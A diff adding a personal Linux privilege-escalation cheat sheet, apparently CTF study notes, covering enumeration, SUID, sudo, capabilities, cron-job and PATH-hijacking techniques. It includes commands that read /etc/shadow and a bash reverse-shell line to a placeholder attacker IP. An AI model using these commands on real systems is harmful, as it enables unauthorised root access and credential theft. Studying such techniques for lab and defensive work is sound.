@@ -1,0 +1,68 @@
+		--- Enumeration ---
+
+hostname		cat /proc/version		cat /etc/issue
+uname -a		ps				env
+sudo -l		cat /etc/passwd		cat /etc/shadow
+history		ifconfig			netstat
+getcap		cat /etc/crontab		cat /etc/exports
+SUID files
+
+(
+   + find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+   + find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+   + find / -type d -name config: find the directory named config under “/”
+   + find / -type f -perm 0777: find files with the 777 permissions
+   + find / -perm a=x: find executable files
+   + find /home -user frank: find all files for user “frank” under “/home”
+   + find / -mtime 10: find files that were modified in the last 10 days
+   + find / -atime 10: find files that were accessed in the last 10 day
+   + find / -cmin -60: find files changed within the last hour (60 minutes)
+   + find / -amin -60: find files accesses within the last hour (60 minutes)
+   + find / -size 50M: find files with a 50 MB size
+   + find / -writable 2>/dev/null: Writable Folders
+)
+
+Automated Enum. tools:     LinPeas - LinEnum
+				   LES (Linux Exploit Suggester) 
+			  	   Linux Smart Enumeration - Linux Priv Checker
+
+		--- Kernel Exploit ---
+
+The Kernel exploit methodology;
+
+    1) Find the kernel version
+    2) Search for the exploit for the known kernel version.
+    3) EXecute the exploit
+
+		--- Sudo ---
+
+    1) Look for application that allows us to run with root privileges (sudo -l)
+    2) Look at the https://gtfobins.github.io/ for exploits
+
+		--- SUID ---
+
+    1) "find / -type f -perm -04000 -ls 2>/dev/null" will list files that have SUID or SGID bits set.
+    2) Look to GTFOBins.
+    3) Example: If nano has SUID bit set, "nano /etc/shadow" command will print the contens of /etc/shadow
+
+		--- Capabilities ---
+
+    1) We can use the "getcap" tool to list enabled capabilities. --> getcap -r /
+    2) Look at the GTFOBins.
+
+		--- Cron Jobs ---
+
+    1) Our goal will be to find a cron job set by root and have it run our script, ideally a shell.
+    2) Ex: if some python files are running as cron jobs, we can edit that file to give us root shell.
+    3) #!bin/bash
+       bash -i >& /dev/tcp/<IP of Attacker/<Port to Listen> 0>&1 (open a listener on host machine)
+
+		--- PATH ---
+
+   1) Let's look what folders are located under $PATH --> echo $PATH
+   2) Can we have the privilege to write that folder? --> find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+   3) Let's say we can write to the tmp/ folder. --> export PATH=/tmp:$PATH
+   4) Let's create a root shell file located at /tmp --> echo "/bin/bash" > FILE
+   5) Make that file readible, writable and executable for all users --> chmod 777 FILE
+   6) If user1 executes this file, we have user1's shell. If root executes, we r gonna have root shell.
+
